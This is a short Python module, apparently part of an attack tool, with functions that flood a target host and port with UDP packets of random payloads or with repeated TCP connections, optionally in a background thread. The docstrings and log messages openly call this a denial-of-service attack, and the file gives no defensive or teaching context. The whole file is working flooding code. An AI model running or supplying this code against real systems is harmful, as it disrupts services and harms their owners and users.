import time
import threading
import random
import string
import socket
import logging

logger = logging.getLogger(__name__)

def generate_random_payload(size):
    """Generate a random payload of given size."""
    payload = ''.join(random.choices(string.ascii_letters + string.digits, k=size))
    return payload.encode()

def perform_dos_attack(target, packets, interval, port, use_udp):
    """Perform a Denial-of-Service (DoS) attack on the target."""
    protocol = socket.SOCK_DGRAM if use_udp else socket.SOCK_STREAM

    try:
        logger.info(f"Starting DoS attack on {target}...")
        for _ in range(packets):
            with socket.socket(socket.AF_INET, protocol) as sock:
                if use_udp:
                    sock.sendto(generate_random_payload(512), (target, port))
                else:
                    sock.connect((target, port))
            time.sleep(interval)
        logger.info("DoS attack completed.")
    except socket.error as e:
        logger.error(f"Socket error occurred during DoS attack: {e}")
    except Exception as e:
        logger.error(f"Error performing DoS attack: {e}")
        
def perform_dos_attack_threaded(target, packets, interval, port, use_udp):
    dos_thread = threading.Thread(target=perform_dos_attack, args=(target, packets, interval, port, use_udp))
    dos_thread.start()
